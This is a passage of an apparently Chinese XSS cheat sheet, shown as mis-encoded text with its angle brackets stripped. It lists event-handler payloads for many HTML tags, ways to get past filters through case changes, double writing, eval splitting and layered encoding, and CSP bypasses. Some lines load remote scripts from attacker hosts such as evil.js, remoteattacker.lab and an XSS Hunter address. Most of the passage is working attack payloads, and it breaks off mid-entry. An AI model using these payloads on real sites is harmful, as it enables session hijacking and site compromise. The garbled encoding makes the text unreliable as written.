‡ç­¾å®šä¹‰æ–‡æ¡£çš„ä¸»ä½“ã€‚body onload=alert(xss)body onpageshow=alert(xss) videoæ ‡ç­¾video æ ‡ç­¾å®šä¹‰è§†é¢‘ï¼Œæ¯”å¦‚ç”µå½±ç‰‡æ®µæˆ–å…¶ä»–è§†é¢‘æµã€‚videosource onerror=alert(1)videosource onerror=alert(xss);/videovideo controls onmouseover=alert(xss);/videovideo controls onfocus=alert(xss); autofocus=/videovideo controls onclick=alert(xss);/video styleæ ‡ç­¾style æ ‡ç­¾å®šä¹‰ HTML æ–‡æ¡£çš„æ ·å¼ä¿¡æ¯ã€‚style onload=alert(1)/style inputæ ‡ç­¾inputæ ‡ç­¾è§„å®šäº†ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­è¾“å…¥æ•°æ®çš„è¾“å…¥å­—æ®µã€‚ç‚¹å‡»è¾“å…¥æ¡†è§¦å‘input onfocus=alert(1);input value= onclick=alert(xss) type=textinput name=name value=onmouseover=prompt(xss) bad=input name=name value=scriptalert(xss)/scriptinput onblur=alert(1) autofocusinput autofocusinput onfocus=alert(1); autofocus details æ ‡ç­¾details æ ‡ç­¾é€šè¿‡æä¾›ç”¨æˆ·å¼€å¯å…³é—­çš„äº¤äº’å¼æ§ä»¶ï¼Œè§„å®šäº†ç”¨æˆ·å¯è§çš„æˆ–è€…éšè—çš„éœ€æ±‚çš„è¡¥å……ç»†èŠ‚ã€‚details ontoggle=alert(1);details open ontoggle=alert(1); select æ ‡ç­¾select æ ‡ç­¾ç”¨æ¥åˆ›å»ºä¸‹æ‹‰åˆ—è¡¨ã€‚select onfocus=alert(1)/selectselect onfocus=alert(1) autofocus iframe æ ‡ç­¾iframe æ ‡ç­¾ä¼šåˆ›å»ºåŒ…å«å¦å¤–ä¸€ä¸ªæ–‡æ¡£çš„å†…è”æ¡†æ¶ iframe onload=alert(1);/iframe audio æ ‡ç­¾audio æ ‡ç­¾å®šä¹‰å£°éŸ³ï¼Œæ¯”å¦‚éŸ³ä¹æˆ–å…¶ä»–éŸ³é¢‘æµã€‚audio src=x onerror=alert(1); textarea æ ‡ç­¾`textarea` æ ‡ç­¾å®šä¹‰ä¸€ä¸ªå¤šè¡Œçš„æ–‡æœ¬è¾“å…¥æ§ä»¶ã€‚textarea onfocus=alert(1); autofocus marquee æ ‡ç­¾marquee onstart=alert(1)/marquee //Chromeä¸è¡Œï¼Œç«ç‹å’ŒIEéƒ½å¯ä»¥ isindex æ ‡ç­¾isindex type=image src=1 onerror=alert(1)//ä»…é™äºIE link æ ‡ç­¾link æ ‡ç­¾å®šä¹‰æ–‡æ¡£ä¸å¤–éƒ¨èµ„æºçš„å…³ç³»ã€‚åœ¨æ— CSPçš„æƒ…å†µä¸‹æ‰å¯ä»¥ä½¿ç”¨ï¼š link rel=import href=http://47.xxx.xxx.72/evil.js a æ ‡ç­¾a href=javascript:alert(1);xss/aa href=x onclick=eval(alert(xss);)xss/aa href=x onmouseover=alert(xss);xss/aa href=x onmouseout=alert(xss);xss/a formæ ‡ç­¾form action=Javascript:alert(1)input type=submitform method=x action=x onmouseover=alert(xss);input type=submit/form buttonæ ‡ç­¾button onclick=alert(1)button onfocus=alert(xss); autofocus=xss/buttonbutton onclick=alert(xss);xss/buttonbutton onmouseover=alert(xss);xss/buttonbutton onmouseout=alert(xss);xss/buttonbutton onmouseup=alert(xss);xss/buttonbutton onmousedown=alert(xss);/button divæ ‡ç­¾è¿™ä¸ªéœ€è¦å€ŸåŠ©urlç¼–ç æ¥å®ç°ç»•è¿‡åŸä»£ç ï¼šdiv onmouseover=alert(1)DIV/divç»è¿‡urlç¼–ç ï¼šdiv onmouseover%3dalert%26lpar%3b1%26rpar%3bDIV%2fdiv objectæ ‡ç­¾è¿™ä¸ªéœ€è¦å€ŸåŠ© data ä¼ªåè®®å’Œ base64 ç¼–ç æ¥å®ç°ç»•è¿‡object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=/object pæ ‡ç­¾p onclick=alert(xss);xss/pp onmouseover=alert(xss);xss/pp onmouseout=alert(xss);xss/pp onmouseup=alert(xss);xss/p ä¸‰ã€ç»•è¿‡æ€è·¯è¿‡æ»¤ å±é™©å­—ç¬¦ â€œ â€˜ ç»•è¿‡ç©ºæ ¼è¿‡æ»¤å½“ç©ºæ ¼è¢«è¿‡æ»¤äº†æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ / æ¥ä»£æ›¿ç©ºæ ¼ï¼š img/src=x/onerror=alert(1); ç©ºæ ¼å›è½¦Tabç»•è¿‡ä¸»è¦å’Œæ­£åˆ™å¯¹æŠ—ç©ºæ ¼ï¼šimg src= javascript:alert(9527); TABï¼š img src= javasc :ript:alert(9528); å›è½¦ï¼š img src= javascript:alert(xss); ç»•è¿‡å¼•å·è¿‡æ»¤å¦‚æœæ˜¯htmlæ ‡ç­¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä¸ç”¨å¼•å·ã€‚å¦‚æœæ˜¯åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·ï¼š img src=x onerror=alert(`xss`); ç»•è¿‡æ‹¬å·è¿‡æ»¤å½“æ‹¬å·è¢«è¿‡æ»¤çš„æ—¶å€™å¯ä»¥ä½¿ç”¨throwæ¥ç»•è¿‡ã€‚throw è¯­å¥ç”¨äºå½“é”™è¯¯å‘ç”Ÿæ—¶æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚ img src=x onerror=javascript:window.onerror=alert;throw 1a onmouseover=javascript:window.onerror=alert;throw 1 ç»•è¿‡å…³é”®å­—è¿‡æ»¤å¤§å°å†™ç»•è¿‡sCRiPtalert(1);/sCrIpTImG sRc=x onerRor=alert(1); åŒå†™ç»•è¿‡æœ‰äº›wafå¯èƒ½ä¼šåªæ›¿æ¢ä¸€æ¬¡ä¸”æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œè¿™ç§æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥è€ƒè™‘åŒå†™å…³é”®å­—ç»•è¿‡ scrscriptiptalert(1);/scrscriptiptimimgg srsrcc=x onerror=alert(1); å­—ç¬¦ä¸²æ‹¼æ¥ç»•è¿‡åˆ©ç”¨eval()å‡½æ•° ä¸PHPçš„eval()å‡½æ•°ç›¸åŒï¼ŒJavaScriptçš„eval()å‡½æ•°ä¹Ÿå¯ä»¥è®¡ç®— JavaScript å­—ç¬¦ä¸²ï¼Œå¹¶æŠŠå®ƒä½œä¸ºè„šæœ¬ä»£ç æ¥æ‰§è¡Œã€‚ img src=x onerror=a=aler;b=t;c=(1);eval(a+b+c)img src=x onerror=a=`aler`;b=`t`;c=(`xss`);;eval(a+b+c)!--åœ¨jsä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿å•åŒå¼•å·-- åˆ©ç”¨top scripttop[al+ert](`xss`);/scriptscripttop[al+ert](xss);/script æ‹†åˆ†æ³•å½“ Web åº”ç”¨ç¨‹åºå¯¹ç›®æ ‡ç”¨æˆ·çš„è¾“å…¥é•¿åº¦è¿›è¡Œäº†é™åˆ¶æ—¶ï¼Œè¿™æ—¶æ— æ³•æ³¨å…¥è¾ƒé•¿çš„xssæ”»å‡»å‘é‡ï¼Œä½†æ˜¯ç‰¹å®šæƒ…å†µä¸‹ï¼Œè¿™ç§é™åˆ¶å¯ä»¥é€šè¿‡æ‹†åˆ†æ³•æ³¨å…¥çš„æ–¹å¼è¿›è¡Œç»•è¿‡ scripta=document.write(/scriptscripta=a+script src=ht/scriptscripta=a+tp://note163.com/xs/scriptscripta=a+s.js/script)/scriptscripteval(a)/script/*document.write(script src = http://note163.com/xss.js/script)*/ ä¸Šä¼ æ–‡ä»¶æ„é€ xssä¸Šä¼ æ™®é€šæ–‡ä»¶æ›´æ”¹æ–‡ä»¶åä¸ºxssè¯­å¥ .gifpng ç¼–ç ç»•è¿‡æµè§ˆå™¨æ•´ä¸ªè§£æé¡ºåºä¸º3ä¸ªç¯èŠ‚ï¼šHTMLå®ä½“è§£ç  â€”URLè§£ç  â€”JSè§£ç ï¼ˆåªæ”¯æŒUnicodeï¼‰ HTML å®ä½“ç¼–ç  æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸ºHTMLå®ä½“ï¼Œå› ä¸ºè§£æHTMLä¹‹åå»ºç«‹èµ·èŠ‚ç‚¹ï¼Œç„¶åä¼šå¯¹DOMèŠ‚ç‚¹é‡Œé¢çš„HTMLå®ä½“è¿›è¡Œè§£æã€‚HTML ç¼–ç ä¸»è¦åˆ†ä¸º10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼Œæ ¼å¼ä¸ºä»¥ # å¼€å¤´ä»¥åˆ†å· ; ç»“å°¾ï¼ˆä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·ï¼‰ã€‚ !--a href=javascript:alert(xss)test\\/a--!--åè¿›åˆ¶--a href=#106;#97;#118;#97;#115;#99;#114;#105;#112;#116;#58;#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41;test/a !--åå…­è¿›åˆ¶--a href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a !--ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·--a href=#x6A#x61#x76#x61#x73#x63#x72#x69#x70#x74#x3A#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29test/a!--img src=x onerror=alert(xss)--!--åè¿›åˆ¶--img src=x onerror=#97;#108;#101;#114;#116;#40;#34;#120;#115;#115;#34;#41; !--åå…­è¿›åˆ¶--img src=x onerror=#x61;#x6C;#x65;#x72;#x74;#x28;#x22;#x78;#x73;#x73;#x22;#x29; !--ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·--img src=x onerror=#x61#x6C#x65#x72#x74#x28#x22#x78#x73#x73#x22#x29 HTMLå­—ç¬¦å®ä½“ï¼Œå¹¶ä¸æ˜¯è¯´ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰å¤„äº â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ã€â€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ å’Œ â€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ è¿™ä¸‰ç§çŠ¶æ€ä¸­çš„HTMLå­—ç¬¦å®ä½“å°†ä¼šä» #â€¦ å½¢å¼è§£ç ï¼Œè½¬åŒ–æˆå¯¹åº”çš„è§£ç å­—ç¬¦å¹¶è¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ã€‚ ä¸€ä¸ªHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ª ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿ ç¬¦å·ï¼‰å°±ä¼šè¿›å…¥ æ ‡ç­¾å¼€å§‹çŠ¶æ€(Tag open state) ï¼Œç„¶åè½¬å˜åˆ° æ ‡ç­¾åçŠ¶æ€(Tag name state) ã€ å‰å±æ€§åçŠ¶æ€(before attribute name state) â€¦â€¦æœ€åè¿›å…¥ æ•°æ®çŠ¶æ€(Data state) å¹¶é‡Šæ”¾å½“å‰æ ‡ç­¾çš„tokenã€‚å½“è§£æå™¨å¤„äºæ•°æ®çŠ¶æ€(Data state) æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾å‡ºä¸€ä¸ªtokenã€‚ ç®€å•çš„è¯´å°±æ˜¯ï¼Œæµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLæ–‡æ¡£ï¼Œå°†ä¼—å¤šæ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚ **æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š**æ•°æ®çŠ¶æ€å°±æ˜¯è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚ div.../div ä¸­çš„å†…å®¹ï¼Œå½“æµè§ˆå™¨è§£æå®Œ div æ ‡ç­¾ä¹‹åå¦‚æœå‘ç°æ ‡ç­¾å†…è¿˜å«æœ‰å®ä½“å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº† **å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š**å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨å°±å¥½ç†è§£äº†ï¼Œå°±æ˜¯srcï¼Œherfè¿™æ ·çš„å±æ€§å€¼ä¸­çš„HTMLå®ä½“ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHTMLè§£ç çš„ã€‚ RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼šç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚ areaã€brã€base ç­‰ç­‰ã€‚ç©ºå…ƒç´ ä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ã€‚ åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰ script å’Œ styleã€‚åŸå§‹æ–‡æœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€‚ RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰ textarea å’Œ titleã€‚RCDATAå…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚ å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ ã€‚åŸºæœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚ æ³¨æ„åˆ°RCDATAå…ƒç´ ä¸­æœ‰ textarea å’Œ title ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«å¹¶è¿›è¡ŒHTMLç¼–ç è§£æã€‚è¿™é‡Œè¦å†æé†’ä¸€æ¬¡ï¼Œåœ¨è§£æè¿™äº›å­—ç¬¦å¼•ç”¨çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ï¼Œæ‰€ä»¥HTMLç¼–ç çš„XSSè¯­å¥è§¦å‘ä¸äº†XSSã€‚ HTMLçš„äº”ç±»å…ƒç´ ä¸­ï¼Œåƒ scriptã€style è¿™æ ·çš„åŸå§‹æ–‡æœ¬å…ƒç´ åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦,ä¸ä¼šè§¦å‘è¯­å¥åŸæœ‰çš„ç»“æœã€‚ä½†æ˜¯å½“åœ¨å‰é¢åŠ ä¸Š svg ï¼Œå³å¯æˆåŠŸå¼¹çª—ã€‚ URLç¼–ç æˆ‘ä»¬å¯ä»¥å¹¶å°†srcæˆ–hrefå±æ€§ä¸­çš„å†…å®¹è¿›è¡ŒURLç¼–ç ï¼Œå½“HTMLè§£æå™¨å¯¹srcæˆ–hrefä¸­çš„å­—ç¬¦å®ŒæˆHTMLè§£ç åï¼Œæ¥ä¸‹æ¥URLè§£æå™¨ä¼šå¯¹srcæˆ–hrefä¸­çš„å€¼è¿›è¡ŒURLè§£ç ã€‚ a href=javascript:alert(xss)test/aa href=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29test/aiframe src=javascript:alert(xss)/iframeiframe src=javascript:%61%6c%65%72%74%28%22%78%73%73%22%29/iframe!--ä¼ªåè®®å¤´ javascript: æ˜¯ä¸èƒ½è¿›è¡Œç¼–ç çš„ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªURLè§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œå³ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´DOMèŠ‚ç‚¹ä¸­è¢«ç¼–ç çš„â€œjavascriptâ€æ²¡æœ‰è¢«è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«äº†ã€‚å¦‚ï¼šhttp://www.baidu.com å¯ä»¥è¢«URLç¼–ç ä¸º http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6dï¼Œä½†æ˜¯ä¸èƒ½æŠŠåè®®ä¹Ÿè¿›URLç¼–ç ï¼š%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6dä½†æ˜¯ä¼ªåè®®å¤´ javascript: å¯ä»¥è¿›è¡ŒHTMLç¼–ç ã€‚-- Javascript ç¼–ç æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸º Javascript ç¼–ç ã€‚å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ scriptã€style è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ srcã€ href åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚Javascript ä¸­å¯ä»¥è¯†åˆ«çš„ç¼–ç ç±»å‹æœ‰ï¼š Unicode ç¼–ç  å…«è¿›åˆ¶ç¼–ç  åå…­è¿›åˆ¶ç¼–ç  Unicodeç¼–ç çš„æ¯”è¾ƒå¹¿æ³›ï¼Œè€Œå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶åªæœ‰åœ¨DOMç¯å¢ƒæˆ–eval()ç­‰å‡½æ•°ä¸­æ‰å¯ä»¥ç”¨ã€‚ Unicode ç¼–ç scriptalert(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(xss)/scriptscript\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)/scripta href=javascript:alert(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aa href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(\\u0078\\u0073\\u0073)test/a!--ä¸èƒ½å¯¹ä¼ªåè®®å¤´ javascript: è¿›è¡Œ Javascript ç¼–ç ã€‚å¹¶ä¸”åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·è¿™æ ·çš„ç¬¦å·æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿› Javascript ç¼–ç ï¼Œä½†æ˜¯èƒ½è¿›è¡ŒHTMLç¼–ç ã€‚-- åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç å¯¹äºå…«è¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ Unicode ç¼–ç è¿˜æ˜¯æœ‰åŒºåˆ«ï¼Œè¦æƒ³è®©ä»–ä»¬èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬è¦å°†ä»–ä»¬æ”¾åœ¨DOMç¯å¢ƒä¸­scriptalert(xss)/scriptscript\\141\\154\\145\\162\\164(xss)/scripta href=javascript:alert(xss)test/aa href=javascript:\\x61\\x6c\\x65\\x72\\x74(xss)test/a!--å¦‚æœè¿‡æ»¤äº† ã€ã€ã€ã€ã€% ç­‰ç­‰è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨JavaScriptç¼–ç çš„æ–¹æ³•å°†XSSè¯­å¥å…¨éƒ¨ç¼–ç --å³ iframe src=javascript:alert(xss)/iframe çš„ä»¥ä¸‹ç¼–ç éƒ½å¯ä»¥å¼¹çª—ï¼š!--Unicodeç¼–ç --\\u003C\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u0020\\u0073\\u0072\\u0063\\u003D\\u006A\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074\\u003A\\u0061\\u006C\\u0065\\u0072\\u0074\\u0028\\u0027\\u0078\\u0073\\u0073\\u0027\\u0029\\u003E\\u003C\\u002F\\u0069\\u0066\\u0072\\u0061\\u006D\\u0065\\u003E!--å…«è¿›åˆ¶ç¼–ç --\\74\\151\\146\\162\\141\\155\\145\\40\\163\\162\\143\\75\\152\\141\\166\\141\\163\\143\\162\\151\\160\\164\\72\\141\\154\\145\\162\\164\\50\\47\\170\\163\\163\\47\\51\\76\\74\\57\\151\\146\\162\\141\\155\\145\\76!--åå…­è¿›åˆ¶ç¼–ç --\\x3c\\x69\\x66\\x72\\x61\\x6d\\x65\\x20\\x73\\x72\\x63\\x3d\\x6a\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3a\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\\x3e\\x3c\\x2f\\x69\\x66\\x72\\x61\\x6d\\x65\\x3e å¦ä¸€ç§å¼¹çª—çš„æ–¹æ³•scriptalert(xss)/scriptscripteval(\\141\\154\\145\\162\\164\\50\\42\\170\\163\\163\\42\\51)/scripta href=javascript:alert(xss)test/aa href=javascript:eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x22\\x78\\x73\\x73\\x22\\x29)test/aimg src=x onerror=alert(xss)img src=x onerror=eval(\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29) æ··åˆç¼–ç a href=javascript:alert(xss)test/aé¦–å…ˆå¯¹â€œalertâ€è¿›è¡ŒJavaScript Unicodeç¼–ç ï¼ša href=javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(xss)test/aç„¶åå†å¯¹ \\u0061\\u006c\\u0065\\u0072\\u0074 è¿›è¡ŒURLç¼–ç ï¼ša href=javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(xss)test/aæœ€åå¯¹æ ‡ç­¾ä¸­çš„ javascript:%5c%75...%37%34(xss) æ•´ä½“è¿›è¡ŒHTMLç¼–ç å³å¯ï¼š svga href=#x6A;#x61;#x76;#x61;#x73;#x63;#x72;#x69;#x70;#x74;#x3A;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x31;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x36;#x33;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x36;#x25;#x33;#x35;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x32;#x25;#x35;#x63;#x25;#x37;#x35;#x25;#x33;#x30;#x25;#x33;#x30;#x25;#x33;#x37;#x25;#x33;#x34;#x28;#x22;#x78;#x73;#x73;#x22;#x29;test/a å››ã€CSPç»•è¿‡1.jsonpç»•è¿‡è¦æ±‚ï¼š CSPï¼šfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self https://www.google.com https://www.youtube.com; object-src none;/font 2.ç»•è¿‡ CSP é»˜è®¤æºè¦æ±‚ï¼š CSP ç±»ä¼¼font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);Content-Security-Policy: default-src self unsafe-inline;/fontï¼Œ æœ‰æ•ˆè½½è·ï¼š font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);http://example.lab/csp.php?xss=f=document.createElement%28iframe%29;f.id=pwn;f.src=/robots.txt;f.onload=%28%29=%7Bx=document.createElement%28%27script%27%29;x.src=%27//remoteattacker.lab/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;/font script=document.createElement(script);script.src=//remoteattacker.lab/csp.js;window.frames[0].document.head.appendChild(script); 3.ç»•è¿‡ CSP åœ¨çº¿è¯„ä¼°(iframeè¢«ç¦æ­¢)è¦æ±‚ï¼š CSPæˆ– CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);inline/fontæˆ–font style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);eval/font æœ‰æ•ˆè½½è·ï¼š ddocument;fd.createElement(â€œiframeâ€);f.srcd.querySelector(â€˜link[href*â€.cssâ€]â€™).href;d.body.append(f);sd.createElement(â€œscriptâ€);s.srcâ€https:[YOUR_XSSHUNTER_USERNAME].xss.htâ€;setTimeout(function(){f.contentWindow.document.head.append(s);},1000) 4.ç»•è¿‡ CSP è„šæœ¬æºè‡ªèº«è¦æ±‚ï¼š ç±»ä¼¼ CSPfont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self/font æœ‰æ•ˆè½½è·ï¼š 5.ç»•è¿‡ CSP è„šæœ¬æºæ•°æ®è¦æ±‚ï¼š CSP å°±åƒMozillafont style=color:rgb(54, 70, 78);background-color:rgb(245, 245, 245);script-src self data:/fontå®˜æ–¹æ–‡æ¡£ä¸­è­¦å‘Šçš„é‚£æ ·ã€‚ æœ‰æ•ˆè½½è·ï¼š /"},{"title":"ç»•è¿‡ CSP é»˜è®¤æº","path":"/wiki/WebçŸ¥è¯†ç‚¹/xss/ç»•è¿‡ CSP é»˜è®¤æº.html","content":"ğŸ” æ”»å‡»åŸç†è¯¦è§£âœ… CSP è®¾ç½®åˆ†æfont style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 0.03);default-src self unsafe-inline;/font font style=color:rgba(0, 0, 0, 0.9);background-color:rgba(0, 0, 0, 